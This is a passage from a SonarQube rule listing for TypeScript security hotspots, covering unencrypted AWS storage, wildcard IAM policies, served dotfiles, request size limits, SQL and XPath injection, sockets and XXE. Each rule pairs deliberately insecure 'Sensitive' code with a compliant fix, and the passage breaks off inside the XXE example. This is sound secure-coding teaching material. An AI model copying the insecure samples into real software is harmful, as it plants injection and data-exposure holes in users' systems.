  engine: rds.DatabaseClusterEngine.auroraMysql({ version: rds.AuroraMysqlEngineVersion.VER_2_08_1 }),
  instanceProps: {
    vpcSubnets: {
      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,
    },
    vpc,
  },
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const vpc: ec2.Vpc;

new rds.DatabaseClusterFromSnapshot(this, &#39;example&#39;, {
  engine: rds.DatabaseClusterEngine.aurora({ version: rds.AuroraEngineVersion.VER_1_22_2 }),
  instanceProps: {
    vpc,
  },
  snapshotIdentifier: &#39;exampleSnapshot&#39;,
  storageEncrypted: true,
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const vpc: ec2.Vpc;

new rds.DatabaseInstance(this, &#39;example&#39;, {
  engine: rds.DatabaseInstanceEngine.POSTGRES,
  vpc,
  storageEncrypted: true,
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const sourceInstance: rds.DatabaseInstance;

new rds.DatabaseInstanceReadReplica(this, &#39;example&#39;, {
  sourceDatabaseInstance: sourceInstance,
  instanceType: ec2.InstanceType.of(ec2.InstanceClass.BURSTABLE2, ec2.InstanceSize.LARGE),
  vpc,
  storageEncrypted: true,
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html" rel="nofollow">AWS Documentation</a> - Encrypting Amazon RDS
  resources </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6302">
              typescript:S6302
            </a>
          </td>
          <td>
            <details>
              <p>A policy that grants all permissions may indicate an improper access control, which violates <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a>. Suppose an identity is granted full
permissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources
may occur and therefore result in loss of information.</p>
<h2>Ask Yourself Whether</h2>
<p>Identities obtaining all the permissions:</p>
<ul><li> only require a subset of these permissions to perform the intended function. </li><li> have monitored activity showing that only a subset of these permissions is actually used. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start
with the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in
production, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>
<h2>Sensitive Code Example</h2>
<p>A customer-managed policy that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>
<pre>
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;

new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: [&#34;*&#34;], // Sensitive
    resources: [&#34;arn:aws:iam:::user/*&#34;],
})
</pre>
<h2>Compliant Solution</h2>
<p>A customer-managed policy that grants only the required permissions:</p>
<pre>
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;

new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: [&#34;iam:GetAccountSummary&#34;],
    resources: [&#34;arn:aws:iam:::user/*&#34;],
})
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cloud.google.com/iam/docs/understanding-roles" rel="nofollow">Google Cloud Documentation</a> - Understanding roles </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6308">
              typescript:S6308
            </a>
          </td>
          <td>
            <details>
              <p>Amazon OpenSearch Service is a managed service to host OpenSearch instances. It replaces Elasticsearch Service, which has been deprecated.</p>
<p>To harden domain (cluster) data in case of unauthorized access, OpenSearch provides data-at-rest encryption if the engine is OpenSearch (any
version), or Elasticsearch with a version of 5.1 or above. Enabling encryption at rest will help protect:</p>
<ul><li> indices </li><li> logs </li><li> swap files </li><li> data in the application directory </li><li> automated snapshots </li></ul>
<p>Thus, adversaries cannot access the data if they gain physical access to the storage medium.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to encrypt OpenSearch domains that contain sensitive information.</p>
<p>OpenSearch handles encryption and decryption transparently, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.Domain.html" rel="nofollow">aws-cdk-lib.aws_opensearchservice.Domain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from &#39;aws-cdk-lib&#39;;

const exampleDomain &#61; new opensearchservice.Domain(this, &#39;ExampleDomain&#39;, {
  version: EngineVersion.OPENSEARCH_1_3,
}); // Sensitive, encryption must be explicitly enabled
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.CfnDomain.html" rel="nofollow">aws-cdk-lib.aws_opensearchservice.CfnDomain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from &#39;aws-cdk-lib&#39;;

const exampleCfnDomain &#61; new opensearchservice.CfnDomain(this, &#39;ExampleCfnDomain&#39;, {
  engineVersion: &#39;OpenSearch_1.3&#39;,
}); // Sensitive, encryption must be explicitly enabled
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.Domain.html" rel="nofollow">aws-cdk-lib.aws_opensearchservice.Domain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from &#39;aws-cdk-lib&#39;;

const exampleDomain &#61; new opensearchservice.Domain(this, &#39;ExampleDomain&#39;, {
  version: EngineVersion.OPENSEARCH_1_3,
  encryptionAtRest: {
    enabled: true,
  },
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.CfnDomain.html" rel="nofollow">aws-cdk-lib.aws_opensearchservice.CfnDomain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from &#39;aws-cdk-lib&#39;;

const exampleCfnDomain &#61; new opensearchservice.CfnDomain(this, &#39;ExampleCfnDomain&#39;, {
  engineVersion: &#39;OpenSearch_1.3&#39;,
  encryptionAtRestOptions: {
    enabled: true,
  },
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/opensearch-service/latest/developerguide/encryption-at-rest.html" rel="nofollow">AWS Documentation</a> - Encryption of
  data at rest for Amazon OpenSearch Service </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5691">
              typescript:S5691
            </a>
          </td>
          <td>
            <details>
              <p>Hidden files are created automatically by many tools to save user-preferences, well-known examples are <code>.profile</code>, <code>.bashrc</code>,
<code>.bash_history</code> or .<code>git</code>. To simplify the view these files are not displayed by default using operating system commands like
<code>ls</code>.</p>
<p>Outside of the user environment, hidden files are sensitive because they are used to store privacy-related information or even hard-coded
secrets.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Hidden files may have been inadvertently uploaded to the static server’s public directory and it accepts requests to hidden files. </li><li> There is no business use cases linked to serve files in <code>.name</code> format but the server is not configured to reject requests to this
  type of files. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Disable the serving of hidden files. </li></ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/serve-static" rel="nofollow">Express.js serve-static</a> middleware:</p>
<pre>
let serveStatic &#61; require(&#34;serve-static&#34;);
let app &#61; express();
let serveStaticMiddleware &#61; serveStatic(&#39;public&#39;, { &#39;index&#39;: false, &#39;dotfiles&#39;: &#39;allow&#39;});   // Sensitive
app.use(serveStaticMiddleware);
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/serve-static" rel="nofollow">Express.js serve-static</a> middleware:</p>
<pre>
let serveStatic &#61; require(&#34;serve-static&#34;);
let app &#61; express();
let serveStaticMiddleware &#61; serveStatic(&#39;public&#39;, { &#39;index&#39;: false, &#39;dotfiles&#39;: &#39;ignore&#39;});   // Compliant: ignore or deny are recommended values
let serveStaticDefault &#61; serveStatic(&#39;public&#39;, { &#39;index&#39;: false});   // Compliant: by default, &#34;dotfiles&#34; (file or directory that begins with a dot) are not served (with the exception that files within a directory that begins with a dot are not ignored), see serve-static module documentation
app.use(serveStaticMiddleware);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://github.com/mtojek/go-url-fuzzer" rel="nofollow">github.com/mtojek/go-url-fuzzer</a> - Discover hidden files and directories on a web server.
  </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Web Top 10 2017 Category A6</a> - Security
  Misconfiguration. </li><li> <a href="https://cwe.mitre.org/data/definitions/538" rel="nofollow">MITRE, CWE-538</a> - File and Directory Information Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5693">
              typescript:S5693
            </a>
          </td>
          <td>
            <details>
              <p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevents DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> size limits are not defined for the different resources of the web application. </li><li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting" rel="nofollow">rate limiting</a> features. </li><li> the web application infrastructure has limited resources. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul><li> lower or equal to 8mb for file uploads. </li><li> lower or equal to 2mb for other requests. </li></ul>  </li></ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/formidable" rel="nofollow">formidable</a> file upload module:</p>
<pre>
const form &#61; new Formidable();
form.maxFileSize &#61; 10000000; // Sensitive: 10MB is more than the recommended limit of 8MB

const formDefault &#61; new Formidable(); // Sensitive, the default value is 200MB
</pre>
<p><a href="https://www.npmjs.com/package/multer" rel="nofollow">multer</a> (Express.js middleware) file upload module:</p>
<pre>
let diskUpload &#61; multer({
  storage: diskStorage,
  limits: {
    fileSize: 10000000; // Sensitive: 10MB is more than the recommended limit of 8MB
  }
});

let diskUploadUnlimited &#61; multer({ // Sensitive: the default value is no limit
  storage: diskStorage,
});
</pre>
<p><a href="https://www.npmjs.com/package/body-parser" rel="nofollow">body-parser</a> module:</p>
<pre>
// 4MB is more than the recommended limit of 2MB for non-file-upload requests
let jsonParser &#61; bodyParser.json({ limit: &#34;4mb&#34; }); // Sensitive
let urlencodedParser &#61; bodyParser.urlencoded({ extended: false, limit: &#34;4mb&#34; }); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/formidable" rel="nofollow">formidable</a> file upload module:</p>
<pre>
const form &#61; new Formidable();
form.maxFileSize &#61; 8000000; // Compliant: 8MB
</pre>
<p><a href="https://www.npmjs.com/package/multer" rel="nofollow">multer</a> (Express.js middleware) file upload module:</p>
<pre>
let diskUpload &#61; multer({
  storage: diskStorage,
  limits: {
     fileSize: 8000000 // Compliant: 8MB
  }
});
</pre>
<p><a href="https://www.npmjs.com/package/body-parser" rel="nofollow">body-parser</a> module:</p>
<pre>
let jsonParser &#61; bodyParser.json(); // Compliant, when the limit is not defined, the default value is set to 100kb
let urlencodedParser &#61; bodyParser.urlencoded({ extended: false, limit: &#34;2mb&#34; }); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html" rel="nofollow">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/770" rel="nofollow">MITRE, CWE-770</a> - Allocation of Resources Without Limits or Throttling </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2077">
              typescript:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS3649&amp;rule_key&#61;javascript%3AS3649" rel="nofollow">S3649</a>), the goal is only to highlight complex/formatted
queries.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Some parts of the query come from untrusted values (like user inputs). </li><li> The query is repeated/duplicated in other parts of the code. </li><li> The application must support different types of relational databases. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html" rel="nofollow">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li><li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
// &#61;&#61;&#61; MySQL &#61;&#61;&#61;
const mysql &#61; require(&#39;mysql&#39;);
const mycon &#61; mysql.createConnection({ host: host, user: user, password: pass, database: db });
mycon.connect(function(err) {
  mycon.query(&#39;SELECT * FROM users WHERE id &#61; &#39; &#43; userinput, (err, res) &#61;&gt; {}); // Sensitive
});

// &#61;&#61;&#61; PostgreSQL &#61;&#61;&#61;
const pg &#61; require(&#39;pg&#39;);
const pgcon &#61; new pg.Client({ host: host, user: user, password: pass, database: db });
pgcon.connect();
pgcon.query(&#39;SELECT * FROM users WHERE id &#61; &#39; &#43; userinput, (err, res) &#61;&gt; {}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
// &#61;&#61;&#61; MySQL &#61;&#61;&#61;
const mysql &#61; require(&#39;mysql&#39;);
const mycon &#61; mysql.createConnection({ host: host, user: user, password: pass, database: db });
mycon.connect(function(err) {
  mycon.query(&#39;SELECT name FROM users WHERE id &#61; ?&#39;, [userinput], (err, res) &#61;&gt; {});
});

// &#61;&#61;&#61; PostgreSQL &#61;&#61;&#61;
const pg &#61; require(&#39;pg&#39;);
const pgcon &#61; new pg.Client({ host: host, user: user, password: pass, database: db });
pgcon.connect();
pgcon.query(&#39;SELECT name FROM users WHERE id &#61; $1&#39;, [userinput], (err, res) &#61;&gt; {});
</pre>
<h2>Exceptions</h2>
<p>This rule’s current implementation does not follow variables. It will only detect SQL queries which are formatted directly in the function
call.</p>
<pre>
const sql &#61; &#39;SELECT * FROM users WHERE id &#61; &#39; &#43; userinput;
mycon.query(sql, (err, res) &#61;&gt; {}); // Sensitive but no issue is raised.
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA" rel="nofollow">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO" rel="nofollow">Potential SQL/JDOQL Injection (JDO)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE" rel="nofollow">Potential SQL/HQL Injection (Hibernate)</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4817">
              typescript:S4817
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-6272" rel="nofollow">CVE-2016-6272</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-9149" rel="nofollow">CVE-2016-9149</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2012-4837" rel="nofollow">CVE-2012-4837</a> </li></ul>
<p>User-provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the XPATH expression might contain some unsafe input coming from a user. </li></ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Sensitive Code Example</h2>
<pre>
// &#61;&#61;&#61; Server side &#61;&#61;&#61;

var xpath &#61; require(&#39;xpath&#39;);
var xmldom &#61; require(&#39;xmldom&#39;);

var doc &#61; new xmldom.DOMParser().parseFromString(xml);
var nodes &#61; xpath.select(userinput, doc); // Sensitive
var node &#61; xpath.select1(userinput, doc); // Sensitive
</pre>
<pre>
// &#61;&#61;&#61; Client side &#61;&#61;&#61;

// Chrome, Firefox, Edge, Opera, and Safari use the evaluate() method to select nodes:
var nodes &#61; document.evaluate(userinput, xmlDoc, null, XPathResult.ANY_TYPE, null); // Sensitive

// Internet Explorer uses its own methods to select nodes:
var nodes &#61; xmlDoc.selectNodes(userinput); // Sensitive
var node &#61; xmlDoc.SelectSingleNode(userinput); // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/643" rel="nofollow">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4818">
              typescript:S4818
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2011-1785" rel="nofollow">CVE-2011-178</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-5645" rel="nofollow">CVE-2017-5645</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-6597" rel="nofollow">CVE-2018-6597</a> </li></ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul><li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li><li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li></ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> sockets are created without any limit every time a user performs an action. </li><li> input received from sockets is used without being sanitized. </li><li> sensitive data is sent via sockets without being encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li><li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li><li> <a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> any input read from the socket. </li><li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
const net &#61; require(&#39;net&#39;);

var socket &#61; new net.Socket(); // Sensitive
socket.connect(80, &#39;google.com&#39;);

// net.createConnection creates a new net.Socket, initiates connection with socket.connect(), then returns the net.Socket that starts the connection
net.createConnection({ port: port }, () &#61;&gt; {}); // Sensitive

// net.connect is an alias to net.createConnection
net.connect({ port: port }, () &#61;&gt; {}); // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption (&#39;Resource Exhaustion&#39;) </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6319">
              typescript:S6319
            </a>
          </td>
          <td>
            <details>
              <p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker
instances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries
physically access the storage media, they cannot decrypt encrypted data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The instance contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by
SageMaker, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sagemaker.CfnNotebookInstance.html" rel="nofollow"><code>aws-cdk-lib.aws-sagemaker.CfnNotebookInstance</code></a></p>
<pre>
import { CfnNotebookInstance } from &#39;aws-cdk-lib/aws-sagemaker&#39;;

new CfnNotebookInstance(this, &#39;example&#39;, {
      instanceType: &#39;instanceType&#39;,
      roleArn: &#39;roleArn&#39;
}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sagemaker.CfnNotebookInstance.html" rel="nofollow"><code>aws-cdk-lib.aws-sagemaker.CfnNotebookInstance</code></a></p>
<pre>
import { CfnNotebookInstance } from &#39;aws-cdk-lib/aws-sagemaker&#39;;

const encryptionKey &#61; new Key(this, &#39;example&#39;, {
    enableKeyRotation: true,
});
new CfnNotebookInstance(this, &#39;example&#39;, {
    instanceType: &#39;instanceType&#39;,
    roleArn: &#39;roleArn&#39;,
    kmsKeyId: encryptionKey.keyId
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html" rel="nofollow">Protect Data at Rest Using Encryption</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2755">
              typescript:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in libxmljs</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
var libxmljs &#61; require(&#39;libxmljs&#39;);
var fs &#61; require(&#39;fs&#39;);

var xml &#61; fs.readFileSync(&#39;xxe.xml&#39;, &#39;utf8&#39;);
